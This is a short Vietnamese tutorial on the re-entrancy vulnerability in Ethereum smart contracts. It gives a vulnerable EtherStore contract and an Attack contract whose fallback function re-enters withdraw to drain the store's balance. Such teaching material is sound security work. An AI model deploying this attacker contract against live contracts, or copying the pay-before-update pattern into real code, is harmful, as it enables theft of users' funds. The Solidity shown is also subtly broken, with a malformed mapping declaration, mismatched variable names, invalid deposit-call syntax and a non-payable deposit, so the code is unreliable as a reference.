# Giới thiệu - Re-entrancy attack smart contract

Lổ hổng này khai thác quá trình gọi hàm lặp đi lặp lại nhiều lần. Giống như đệ quy, một hàm được gọi đi gọi lại trước khi lời gọi hàm đầu tiên của nó hoàn tất. Từ đấy phá vỡ tính toàn vẹn của dữ liệu, những dữ liệu bên dưới chưa được cập nhật ở lần gọi hàm đầu tiên khi gọi hàm những lần tiếp theo sẽ gây rủi ro bị khai khác.

## Ví dụ
1. Contract lưu trữ tiền - EtherStore.

```solidity
contract EtherStore {
    mapping(address > uint256) private balances;

    function deposit() public {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 _amount) public {
        require(balance[msg.sender] >= _amount);
        msg.sender.call{value:_amount}("");
        balances[msg.sender] -= _amount;
    }

    function getBalances() public view returns (uint256){
        return address(this).balance;
    }

}
```

Contract ở trên có thể bị khai thác lỗ hổng Re-entrancy do lời gọi hàm **_call{value:_amount}("")_**. Khi một withdraw transaction được gọi, khi thực thi đến **msg.sender.call{value:_amount}("")**, sẽ có thể gọi một **_fallback_** function ở contract của kẻ tấn công. Trong fallback function đó, kẻ tấn công có thể gọi lại hàm **_withdraw_** bên contract **EtherStore**, từ đó gây ra một vòng lặp gọi function **_withdraw_** liên tục, mà lần gọi hàm ban đầu vẫn chưa update lại **_balances[msg.sender]_** mặc dù kẻ tấn công đã rút tiền rồi, từ đó khiến balance của **EtherStore** bị bòn rút cho đến khi thành con số 0.

2. Contract của attacker.


```solidity
contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) public {
        etherStore = EtherStore(_addressStoreAddress);
    }

    fallback() external payable {
        if(address(etherStore).balance >= 1 ether){
            etherStore.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >=1);
        etherStore.deposit(value:1 ether);
        etherStore.withdraw(1 ether);
    }

    function getBlaance() public view returns (uint256){
        return address(this).balance;
    }
}

```
Khi attacker gọi function **_attack()_**, khi đến đoạn code **_etherStore.withdraw(1 ether)_**, thì lời gọi hàm **_withdraw()_** bên **EtherStore** xảy ra với tham số là 1 ether. Như giải thích ở mục 1, thì khi đến **msg.sender.call{value:_amount}("")** sẽ gọi hàm **_fallback()_** bên **Attack** contract, rồi tiếp tục gọi hàm **_withdraw_** bên **EtherStore**, cứ lặp đi lặp lại cho đễn khi balance của **EtherStore** về 0.

@phatkhongbug
